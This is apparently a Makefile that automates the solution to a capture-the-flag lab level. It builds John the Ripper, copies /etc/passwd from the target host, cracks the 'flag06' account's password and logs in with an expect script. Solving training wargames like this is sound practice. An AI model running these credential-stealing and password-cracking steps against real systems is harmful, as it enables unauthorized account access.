all: attack-this

include ../Makefile.inc
user=level06
flag=flag06

attack-this:
	test -e 'john-1.8.0' || (wget http://www.openwall.com/john/j/john-1.8.0.tar.xz && tar -xzvf john-1.8.0.tar.xz)
	test -e './john-1.8.0/run/john' || (cd john-1.8.0/src && make clean macosx-x86-64)
	test -e 'passwd' || scp ${user}@${ip}:/etc/passwd ./passwd
	./john-1.8.0/run/john passwd --show | awk -F':' '$$1 == "${flag}" { print $$2 }' > ${token}
	expect ../expect.xp ${flag} ${ip} ${token}
	rm passwd ${token}
